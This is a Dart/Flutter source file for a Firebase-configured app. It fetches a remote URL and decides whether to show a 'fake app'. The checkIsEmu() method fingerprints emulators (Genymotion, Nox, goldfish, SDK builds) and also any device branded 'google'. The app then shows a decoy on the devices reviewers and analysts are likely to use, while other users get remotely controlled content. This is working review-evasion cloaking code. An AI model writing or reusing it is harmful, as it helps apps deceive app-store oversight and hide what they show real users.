import 'dart:developer';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:shared_preferences/shared_preferences.dart';

class UrlReceiverRepository {
  final FirebaseRemoteConfig _remoteConfig;
  String? _url;

  UrlReceiverRepository(FirebaseRemoteConfig remoteConfig)
      : _remoteConfig = remoteConfig;

  Future<void> init() async {
    var sharedPreferences = await SharedPreferences.getInstance();
    _url = sharedPreferences.getString('url');
    log('Local url: $_url');
    if (_url == null || _url!.isEmpty) {
      await _remoteConfig.ensureInitialized();
      await _remoteConfig.fetchAndActivate();
      _url = _remoteConfig.getString('url');
      sharedPreferences.setString('url', _url!);
      log('Take remote url: $_url');
    }
  }

  String? get url => _url;

  Future<bool> get isFakeAppShown async {
    return _url == null || _url!.isEmpty || await checkIsEmu();
  }

  Future<bool> checkIsEmu() async {
    final em = await DeviceInfoPlugin().androidInfo;
    var phoneModel = em.model;
    var buildProduct = em.product;
    var buildHardware = em.hardware;
    var result = (em.fingerprint.startsWith("generic") ||
        phoneModel.contains("google_sdk") ||
        phoneModel.contains("droid4x") ||
        phoneModel.contains("Emulator") ||
        phoneModel.contains("Android SDK built for x86") ||
        em.manufacturer.contains("Genymotion") ||
        buildHardware == "goldfish" ||
        buildHardware == "vbox86" ||
        buildProduct == "sdk" ||
        buildProduct == "google_sdk" ||
        buildProduct == "sdk_x86" ||
        buildProduct == "vbox86p" ||
        em.brand.contains('google') ||
        em.board.toLowerCase().contains("nox") ||
        em.bootloader.toLowerCase().contains("nox") ||
        buildHardware.toLowerCase().contains("nox") ||
        !em.isPhysicalDevice ||
        buildProduct.toLowerCase().contains("nox"));
    if (result) return true;
    result = result ||
        (em.brand.startsWith("generic") && em.device.startsWith("generic"));
    if (result) return true;
    result = result || ("google_sdk" == buildProduct);
    return result;
  }

  Future<bool> hasNetwork() async {
    try {
      final result = await InternetAddress.lookup('google.com');
      return result.isNotEmpty && result[0].rawAddress.isNotEmpty;
    } on SocketException catch (_) {
      return false;
    }
  }
}
